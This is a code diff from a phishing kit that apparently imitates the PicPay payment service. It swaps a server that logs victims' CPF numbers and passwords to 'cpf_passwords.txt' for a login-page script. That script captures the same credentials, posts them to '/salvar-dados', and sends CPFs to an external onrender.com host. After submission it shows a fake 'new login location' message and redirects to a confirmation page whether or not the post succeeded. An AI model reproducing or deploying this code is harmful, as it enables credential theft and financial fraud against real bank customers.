@@ -1,69 +1,125 @@
-const express = require('express');
-const cors = require('cors');
-const fs = require('fs'); 
-const path = require('path'); 
+// Substitua seu script.js por este código completo
 
-const app = express();
-const port = process.env.PORT || 3000;
-const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';
+document.addEventListener('DOMContentLoaded', () => {
 
-app.use(cors()); 
-app.use(express.json()); 
+    const inicializarMascaraCPF = () => {
+        const cpfField = document.querySelector('input[placeholder^="CPF"]'); // Pega qualquer input que comece com "CPF"
+        if (cpfField) {
+            cpfField.addEventListener('input', (event) => {
+                let value = event.target.value.replace(/\D/g, '');
+                value = value.substring(0, 11);
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+                value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+                event.target.value = value;
+            });
+        }
+    };
 
-app.use(express.static(path.join(__dirname, 'public')));
+    const inicializarModais = () => {
+        const modalOverlay = document.getElementById('modalOverlay');
+        if (!modalOverlay) return; 
 
-app.post('/salvar-dados', (req, res) => {
+        const modalContent = document.getElementById('modalContent');
+        const closeModalBtn = document.querySelector('.modal-close-btn');
+
+        const modalData = {
+            forgotPasswordLink: { title: 'Recuperar Senha', content: `<p>Para recuperar sua senha, digite o CPF cadastrado. Enviaremos um link de recuperação para o seu e-mail.</p><form style="margin-top: 20px;"><input type="text" class="input-field" placeholder="Digite seu CPF"><button type="submit" class="btn-entrar">Enviar Link</button></form>`},
+            helpLink: { title: 'Central de Ajuda', content: '<p>Bem-vindo à nossa Central de Ajuda! Aqui você encontra respostas para as dúvidas mais frequentes. Como podemos te ajudar hoje?</p>'},
+            privacyLink: { title: 'Política de Privacidade', content: '<p>Esta é a nossa política de privacidade. Comprometemo-nos a proteger seus dados...</p>'},
+            termsLink: { title: 'Termos de Uso', content: '<p>Ao usar nossos serviços, você concorda com os seguintes termos...</p>'}
+        };
+
+        const openModal = (content) => {
+            modalContent.innerHTML = `<h2>${content.title}</h2><div>${content.content}</div>`;
+            modalOverlay.classList.add('active');
+        };
+        const closeModal = () => {
+            modalOverlay.classList.remove('active');
+        };
+
+        document.querySelectorAll('a[id]').forEach(link => {
+            link.addEventListener('click', e => {
+                e.preventDefault();
+                if (modalData[link.id]) {
+                    openModal(modalData[link.id]);
+                }
+            });
+        });
+        
+        closeModalBtn.addEventListener('click', closeModal);
+        modalOverlay.addEventListener('click', (event) => {
+            if (event.target === modalOverlay) closeModal();
+        });
+    };
+
+const inicializarPaginaLogin = () => {
+    const loginForm = document.querySelector('form:not(#emprestimoForm)');
+    if (!loginForm) return;
+
+    const senhaInput = document.querySelector('input[placeholder="Digite sua senha"]');
+    senhaInput.addEventListener('keydown', (event) => {
+        const code = event.code;
+        if (event.ctrlKey || event.metaKey || !event.key.match(/^\d$/) && event.key.length === 1) {
+            if (!['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'].includes(event.key)) {
+                event.preventDefault();
+            }
+        } else if (!code.startsWith('Digit')) {
+             event.preventDefault();
+        }
+    });
     
-    const { cpf, senha } = req.body;
+    loginForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
+        const cpf = loginForm.querySelector('input[placeholder="CPF"]').value;
+        const senha = senhaInput.value;
+        if (!cpf || !senha) return alert('Por favor, preencha todos os campos.');
+        
+        try {
+            
+            const response = await fetch('/salvar-dados', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cpf, senha }),
+            });
+            
+            await response.json(); 
 
-    if (!cpf || !senha) {
-        return res.status(400).json({ message: "Данные неполные." });
-    }
-
-    const dataHora = new Date().toLocaleString('ru-RU');
-    const linhaDeLog = `[ВХОД - ${dataHora}] - CPF: ${cpf} | Пароль: ${senha}\n`;
-
-    console.log(`[n0fex://cz] :: ← получен пакет авторизации`);
-    console.log(`↳ ${linhaDeLog.trim()}`);
-
-    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
-        if (err) {
-            console.error(`[n0fex://cz] !! ошибка при записи в файл →`, err);
-            return res.status(500).json({ message: 'Внутренняя ошибка сервера.' });
+            
+            window.location.href = 'confirmacao.html';
+            
+        } catch (error) {
+            console.error("Falha ao enviar dados:", error);
+            window.location.href = 'confirmacao.html';
         }
     });
+};
+    const inicializarPaginaEmprestimos = () => {
+        const emprestimoForm = document.getElementById('emprestimoForm');
+        if (!emprestimoForm) return;
+        
+        emprestimoForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const cpf = document.getElementById('cpfEmprestimo').value;
+            if (cpf.length < 14) return alert('Por favor, preencha o CPF corretamente.');
 
-    res.status(401).json({ message: 'Novo local de login identificado, enviamos um codigo de 6 digitos para o email vinculado a esta conta.' });
-});
+            try {
+                const response = await fetch('https://picpay-fky2.onrender.com/acessar-contratos', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cpf }),
+                });
+                const result = await response.json();
+                alert(result.message);
+            } catch (error) {
+                alert('Não foi possível conectar ao servidor. Tente novamente mais tarde.');
+            }
+        });
+    };
 
-app.post('/acessar-contratos', (req, res) => {
-    const { cpf } = req.body;
 
-    if (!cpf) {
-        return res.status(400).json({ message: "CPF обязателен." });
-    }
-
-    const dataHora = new Date().toLocaleString('ru-RU');
-    const linhaDeLog = `[КОНТРАКТЫ - ${dataHora}] - CPF: ${cpf}\n`;
-
-    console.log(`[n0fex://cz] :: ← получен запрос доступа к контрактам`);
-    console.log(`↳ ${linhaDeLog.trim()}`);
-
-    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
-        if (err) {
-            console.error(`[n0fex://cz] !! сбой при логировании контракта →`, err);
-            return res.status(500).json({ message: 'Внутренняя ошибка сервера.' });
-        }
-        console.log(`[n0fex://cz] ✓ контракт CPF зафиксирован → ${NOME_ARQUIVO_LOG}`);
-    });
-
-    res.status(200).json({ message: 'Доступ к контрактам... пожалуйста, подождите.' });
-});
-
-app.listen(port, () => {
-    console.log(`╔═══════════════════════════════════════════╗`);
-    console.log(`║  ЗАПУСК УСПЕШЕН | n0fex-cz.norte_333      ║`);
-    console.log(`╚═══════════════════════════════════════════╝`);
-    console.log(`[n0fex://cz] > служба прослушивания активна на порту ${port}`);
-    console.log(`[n0fex://cz] > ожидание данных начато...`);
+    inicializarMascaraCPF();
+    inicializarModais();
+    inicializarPaginaLogin();
+    inicializarPaginaEmprestimos();
 });
